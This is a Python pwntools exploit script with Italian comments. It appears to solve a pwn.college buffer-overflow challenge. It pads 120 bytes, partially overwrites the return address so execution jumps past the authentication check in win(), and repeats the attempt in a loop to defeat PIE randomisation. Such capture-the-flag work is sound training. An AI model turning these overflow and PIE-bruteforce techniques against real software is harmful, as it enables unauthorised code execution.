#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
Per risolvere la challenge è necessario cambiare il return address della funzione challenge() con l'indirizzo della funzione win(),
per farlo bisogna calcolare la distanza tra il buffer e il return address (tramite gdb).
Una volta a conoscenza della distanza tra i due si invia un bytestream della lunghezza necessaria
a riempire il buffer e la restante memoria fino all'indirizzo del return address, seguito dal valore che si vuole
inserire al posto del return address. Sostanzialmente si fa overflow del buffer per sovrascrivere 
anche il return address con un valore a scelta (in questo caso l'indirizzo della funzione win()).
La funzione win() esegue un controllo di autenticazione e per essere bypassato è necessario inserire nel bytestream
un indirizzo superiore a quello dell'inizio della funzione win(), in modo tale da saltare il controllo.
In aggiunta alla precedente challenge è attiva la PIE (Position Independent Executable), bisogna quindi "indovinare"
l'indirizzo giusto da inserire nel bytestream (cambia solo una parte dell'indirizzo)
-----------------------------
'''

context.log_level = 'CRITICAL'

elf = ELF('/challenge/babymem-level-7-1')

win_addr =  p16(0x1666)
delta_len = 120
padding = b'A' * delta_len
bytestream = padding + win_addr

while True:

  p = elf.process()

  p.sendline(f'{len(bytestream)}'.encode())
  p.sendline(bytestream)
  output = p.recvall().decode()

  if 'pwn.college' in output:
    print(output)
    break
